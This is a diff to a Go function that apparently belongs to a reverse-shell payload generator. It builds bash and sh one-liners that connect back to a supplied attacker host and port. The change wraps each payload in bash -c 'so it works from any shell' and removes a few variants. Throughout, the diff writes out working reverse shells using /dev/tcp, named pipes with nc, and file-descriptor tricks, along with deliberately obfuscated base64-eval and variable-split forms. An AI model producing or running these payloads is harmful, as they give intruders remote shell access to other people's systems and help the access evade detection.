@@ -58,28 +58,26 @@ func Build(lhost, lport, webPort string) map[string][]Entry {
 	}
 
 	// ── BASH ──────────────────────────────────────────────────────────────────
+	// All payloads are wrapped in bash -c '...' so they work from any shell
+	// (fish, zsh, sh, etc.) without modification.
 	bashPlain := fmt.Sprintf("/bin/bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
 	bashC := fmt.Sprintf("bash -c '/bin/bash -i >& /dev/tcp/%s/%s 0>&1'", lhost, lport)
 	bash := []Entry{
-		{"Direct TCP", bashPlain},
-		{"Bash -c", bashC},
-		{"Named pipe + nc", fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %s >/tmp/f", lhost, lport)},
-		{"File descriptor", fmt.Sprintf("0<&196;exec 196<>/dev/tcp/%s/%s; /bin/bash <&196 >&196 2>&196", lhost, lport)},
-		{"URL-encoded", fmt.Sprintf("%%2Fbin%%2Fbash%%20-i%%20%%3E%%26%%20%%2Fdev%%2Ftcp%%2F%s%%2F%s%%200%%3E%%261", lhost, lport)},
-		{"Base64", base64.StdEncoding.EncodeToString([]byte(bashC))},
-		{"Obfuscated var-split", fmt.Sprintf("h=%s;p=%s;bash -i >/dev/tcp/$h/$p 0>&1 2>&1", lhost, lport)},
-		{"Obfuscated eval+b64", fmt.Sprintf("eval $(echo %s|base64 -d)", base64.StdEncoding.EncodeToString([]byte(bashPlain)))},
+		{"bash -c (works from any shell)", bashC},
+		{"Named pipe + nc", fmt.Sprintf("bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %s >/tmp/f'", lhost, lport)},
+		{"File descriptor", fmt.Sprintf("bash -c '0<&196;exec 196<>/dev/tcp/%s/%s;/bin/bash <&196 >&196 2>&196'", lhost, lport)},
+		{"Obfuscated var-split", fmt.Sprintf("bash -c 'h=%s;p=%s;bash -i >/dev/tcp/$h/$p 0>&1 2>&1'", lhost, lport)},
+		{"Obfuscated eval+b64", fmt.Sprintf("bash -c 'eval $(echo %s|base64 -d)'", base64.StdEncoding.EncodeToString([]byte(bashPlain)))},
 	}
 
 	// ── SH ────────────────────────────────────────────────────────────────────
 	shPlain := fmt.Sprintf("sh -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
 	shC := fmt.Sprintf("sh -c '/bin/sh -i >& /dev/tcp/%s/%s 0>&1'", lhost, lport)
 	sh := []Entry{
-		{"Direct", shPlain},
 		{"sh -c", shC},
-		{"Named pipe + nc", fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", lhost, lport)},
-		{"File descriptor", fmt.Sprintf("0<&196;exec 196<>/dev/tcp/%s/%s; /bin/sh <&196 >&196 2>&196", lhost, lport)},
-		{"Obfuscated eval", fmt.Sprintf("eval $(echo %s|base64 -d)", base64.StdEncoding.EncodeToString([]byte(shPlain)))},
+		{"Named pipe + nc", fmt.Sprintf("bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f'", lhost, lport)},
+		{"File descriptor", fmt.Sprintf("bash -c '0<&196;exec 196<>/dev/tcp/%s/%s;/bin/sh <&196 >&196 2>&196'", lhost, lport)},
+		{"Obfuscated eval", fmt.Sprintf("bash -c 'eval $(echo %s|base64 -d)'", base64.StdEncoding.EncodeToString([]byte(shPlain)))},
 	}
 
 	// ── PYTHON ────────────────────────────────────────────────────────────────
